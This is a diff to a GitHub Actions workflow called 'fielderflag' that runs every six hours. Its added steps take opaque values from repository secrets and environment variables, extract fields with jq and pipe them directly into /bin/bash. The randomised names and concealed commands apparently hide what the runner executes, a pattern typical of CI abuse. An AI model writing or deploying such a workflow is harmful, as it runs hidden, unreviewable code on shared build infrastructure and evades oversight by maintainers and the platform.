@@ -1,26 +1,18 @@
 name: fielderflag
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
-jobs:  # 4938
+    - cron: '8 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fielderflag
         env:
-          icc12232: ${{ secrets.icc12232 }}
+          sb77: ${{ secrets.sb77 }}
         run: |
-          echo $icc12232 | jq -r .xdzl68 | /bin/bash
-          echo $yhz4 | jq -r .slfxh0 | /bin/bash
-          echo $pd9 | jq -r .m626 | /bin/bash
-          echo $yggle16 | jq -r .w0328 | /bin/bash
-          echo $ttf32664 | jq -r .d85764 | /bin/bash
-          echo $xc408 | jq -r .dxlz5 | /bin/bash
-          echo $ewumd4 | jq -r .qotx578 | /bin/bash
-          echo $llars1 | jq -r .hwh458 | /bin/bash
-          echo $z7139 | jq -r .x8 | /bin/bash
-          echo $w537 | jq -r .ixc9 | /bin/bash
+          echo $sb77 | jq -r .bi47894 | /bin/bash
+          echo $p5 | jq -r .rv5 | /bin/bash
 
